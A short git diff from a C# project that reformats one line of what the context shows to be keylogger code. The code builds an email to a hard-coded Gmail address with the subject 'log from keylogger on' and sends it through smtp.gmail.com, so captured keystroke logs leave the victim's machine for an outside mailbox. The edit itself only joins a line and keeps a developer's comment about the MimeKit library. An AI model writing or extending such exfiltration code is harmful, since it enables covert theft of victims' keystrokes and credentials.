@@ -251,10 +251,7 @@ namespace Karios
             try
             {
                 var mail = new MailMessage();
-                var
-                    smtpServer =
-                        new SmtpClient(
-                            "smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
+                var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
                 mail.To.Add("GINGIRULES@gmail.com");
                 mail.Subject = "log from keylogger on" +
